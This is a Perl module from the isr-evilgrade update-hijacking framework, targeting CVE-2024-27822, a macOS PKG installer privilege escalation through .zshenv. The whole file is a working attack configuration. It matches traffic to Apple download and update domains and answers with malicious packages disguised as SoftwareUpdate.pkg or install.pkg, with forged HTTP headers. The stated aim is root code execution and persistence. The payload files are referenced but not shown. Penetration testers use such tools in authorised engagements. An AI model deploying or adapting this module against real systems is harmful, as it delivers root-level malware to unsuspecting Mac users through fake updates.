###############
# macos_pkg_zsh_privesc.pm
#
# CVE-2024-27822: macOS PKG installer ZSH privilege escalation
# .zshenv loaded with root privileges during PKG installation
# Enables arbitrary code execution as root
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::macos_pkg_zsh_privesc;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'macOS PKG ZSH PrivEsc',
    'version'     => '1.0',
    'appver'      => 'macOS Sonoma <= 14.5, Ventura <= 13.6.6, Monterey <= 12.7.4',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2024-27822: Package installer loads .zshenv with root privileges.
Malicious .zshenv file executed during PKG installation with root context.
Enables arbitrary code execution and persistence mechanisms.
Affects: Software installers, app updates, system packages distributed via PKG format.
    },
    'vh' => '(downloads.*\.apple\.com|updates\.apple\.com|.*\.software\.download)',
    'request' => [
        {
            'req'   => '/.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_privesc.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=SoftwareUpdate.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/installer.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/zsh_exploit.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=install.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
